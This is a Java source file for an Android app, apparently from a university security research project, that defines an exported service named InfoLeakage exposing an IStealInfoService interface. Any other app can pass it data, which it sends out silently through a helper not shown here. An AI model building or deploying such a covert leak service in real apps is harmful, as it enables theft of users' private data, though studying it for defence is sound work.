package edu.ntu.security.sendinfoout;

import java.io.IOException;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;
import edu.ntu.security.sendinfoout.aidl.IStealInfoService;

/**
 * This service is to send out information provided by other applications or 
 * activities silently.
 * 
 * It is an exported service, which means any application can invoke
 * it and leverage the service it provides. 
 * @author pillar
 *
 */
public class InfoLeakage extends Service {
	public InfoLeakage() {
		Log.i("InfoLeakage", "I am here waiting for you");
		
	}

	@Override
	public IBinder onBind(Intent intent) {
		return mStealInfoService;
	}
	
	private final IStealInfoService.Stub mStealInfoService = new IStealInfoService.Stub() {
		
		@Override
		public void sendInfoOut(String data) throws RemoteException {
			
			Log.i("DEBUG_FOR_ISTEALINFO", "I receive the remote request");
			
			try {
				Utils.sendInfoOut(data);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			Utils.notifyUser(InfoLeakage.this, data);
		}
	};
	
}
